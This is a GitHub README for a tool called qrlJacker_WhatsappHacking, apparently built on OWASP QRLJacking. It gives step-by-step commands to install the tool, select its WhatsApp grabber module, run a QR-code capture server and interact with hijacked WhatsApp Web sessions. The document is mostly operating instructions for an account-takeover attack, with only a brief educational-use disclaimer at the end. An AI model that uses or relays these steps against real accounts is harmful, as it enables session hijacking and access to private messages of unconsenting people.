# qrlJacker_WhatsappHacking

qrlJacker_WhatsappHacking is a tool based on [OWASP QRLJacking](https://github.com/OWASP/QRLJacking/tree/master/QRLJacker) that allows session hijacking of WhatsApp Web using QR code manipulation.

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/alexuuhat/qrlJacker_WhatsappHacking.git
   cd qrlJacker_WhatsappHacking
   ```
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
3. Run the tool:
   ```bash
   python QrlJacker.py
   ```

## Usage

Once inside the QrlJacker console, you can use the following commands:

### Basic Commands
```
QrlJacker> help       # Show available commands
QrlJacker> banner     # Display the banner
QrlJacker> list       # List available modules
QrlJacker> info grabber/whatsapp  # Get information about the WhatsApp module
```

### Exploiting WhatsApp Web
```
QrlJacker> use grabber/whatsapp  # Select the WhatsApp grabber module
QrlJacker> options               # Show module options
QrlJacker> set port 1337         # Set the port for the server
QrlJacker> options               # Verify the configuration
QrlJacker> run                   # Start capturing QR codes
```

### Managing Sessions
```
[+] Got session on Whatsapp module
> sessions        # List active sessions
> sessions -h     # Show help for session management
> sessions -i 1   # Interact with session ID 1
```

### Managing Jobs
```
> jobs            # Show running jobs
> jobs -h         # Show help for job management
> jobs -K         # Kill all running jobs
```

## Documentation

For full documentation and additional details, refer to the original [OWASP QRLJacking project](https://github.com/OWASP/QRLJacking/tree/master/QRLJacker).

## Disclaimer

This tool is intended for educational and research purposes only. Unauthorized access to accounts or services without permission is illegal and unethical. Use responsibly.

---

**Author:** [alexuuhat](https://github.com/alexuuhat)